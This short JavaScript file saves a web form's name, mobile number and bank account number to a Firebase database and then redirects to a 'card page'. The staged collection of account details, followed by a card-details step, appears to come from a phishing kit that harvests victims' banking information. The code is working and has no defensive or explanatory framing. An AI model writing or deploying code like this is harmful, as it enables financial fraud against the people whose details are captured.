
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

    var aname = getElementVal("aname");
    var bmobile = getElementVal("bmobile");
    var cac = getElementVal("cac");
    
    

  

  saveMessages(aname, bmobile ,cac);

  // redirect to card page
  window.location.href = "2.html";
}

const saveMessages = (aname, bmobile ,cac) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
      Name: aname,
      mobile: bmobile,
      Ac_no: cac,
      
      
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

